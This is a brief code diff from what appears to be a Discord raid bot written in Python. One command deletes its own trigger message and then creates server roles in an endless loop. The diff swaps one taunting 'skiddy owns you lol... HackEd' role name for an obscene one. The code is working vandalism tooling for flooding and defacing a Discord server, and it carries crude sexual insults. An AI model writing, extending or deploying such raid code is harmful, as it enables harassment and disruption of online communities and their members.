@@ -84,7 +84,7 @@ async def r(ctx):
     await ctx.message.delete()
     while True:
         guild = ctx.guild
-        await guild.create_role(name="skiddy owns you lol HhackedhackedckEd HackEd HackEd")
+        await guild.create_role(name="skiddy owns you lol cOckLicKerS pEniS BalLs")
  
  
 @bot.command(pass_context=True)
